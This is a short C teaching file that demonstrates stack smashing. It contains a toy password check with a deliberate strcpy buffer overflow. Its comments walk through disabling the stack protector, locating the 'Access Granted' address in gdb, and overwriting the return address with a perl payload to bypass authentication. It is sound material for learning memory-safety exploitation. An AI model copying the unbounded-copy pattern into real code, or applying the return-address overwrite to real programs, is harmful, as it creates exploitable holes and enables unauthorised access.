// Stack smashing to bypass password protection.
// Author: Matus Marhefka
//
// GCC Stack-Smashing Protector (ProPolice):
// By default, stack-smashing protection can be attained by adding
// the -fstack-protector flag for string protection, or -fstack-protector-all
// for protection of all types. On some systems (Linux, OpenBSD), ProPolice is
// enabled by default, and the -fno-stack-protector flag disables it.
// So compile as:
// $ gcc -g -fno-stack-protector auth_overflow.c -o auth
// otherwise you will not be able to smash the stack.

// Next, launch gdb and find adress, which gives us "Access Granted".
// $ gdb -q ./auth
// (gdb) disass main
// ...
// 0x00000000004006ae <+73>:	call   0x4005d4 <check_authentication>
// 0x00000000004006b3 <+78>:	test   eax,eax
// 0x00000000004006b5 <+80>:	je     0x4006d7 <main+114>
// 0x00000000004006b7 <+82>:	mov    edi,0x400803
// ...
// its adress 0x00000000004006b7, so we need to replace return
// adress of check_authentication function with adress 0x00000000004006b7.
// The vulnerability is in function check_authentication at the line
// 36 -> strcpy(password_buffer, password); this command is copying
// argv[1] to local variable on stack withou bounds checking.
// We write the adress 0x00000000004006b7 10 times to be sure it rewrites
// the return adress and as the stack-smashing protection is disabled, it works.
// $ ./auth $(perl -e 'print "\xb7\x06\x40\x00\x00\x00\x00\x00"x10')

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
	char password_buffer[16];
	int auth_flag = 0;

	strcpy(password_buffer, password);
	
	if (strcmp(password_buffer, "pwd1") == 0)
		auth_flag = 1;
	if (strcmp(password_buffer, "pwd2") == 0)
		auth_flag = 1;

	return auth_flag;
}

int main(int argc, char *argv[]) {
	if (argc < 2) {
		printf("Usage: %s <password>\n", argv[0]);
		exit(0);
	}
	if (check_authentication(argv[1])) {
		printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
		printf("      Access Granted.\n");
		printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
	} else {
		printf("\nAccess Denied.\n");
   }
}	
